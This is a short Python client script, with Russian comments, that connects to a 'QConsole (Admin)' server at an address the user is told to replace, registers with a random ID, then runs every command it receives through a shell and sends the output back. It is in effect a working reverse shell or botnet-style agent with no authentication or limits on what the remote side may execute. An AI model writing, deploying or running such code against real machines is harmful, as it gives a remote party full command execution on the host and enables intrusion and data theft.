import socket
import subprocess
import threading
import random

def connect_to_admin():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('127.0.0.1', 9999))  # Замените на IP адрес QConsole (Admin)
    client_id = random.randint(100, 999)
    client.send(str(client_id).encode('utf-8'))
    print(f"Подключен к QConsole (Admin) с ID: {client_id}")

    while True:
        command = client.recv(1024).decode('utf-8')
        if not command:
            break
        # Выполняем команду на локальной машине
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        # Отправляем результат обратно
        client.send(result.stdout.encode('utf-8'))
    client.close()

if __name__ == "__main__":
    connect_to_admin()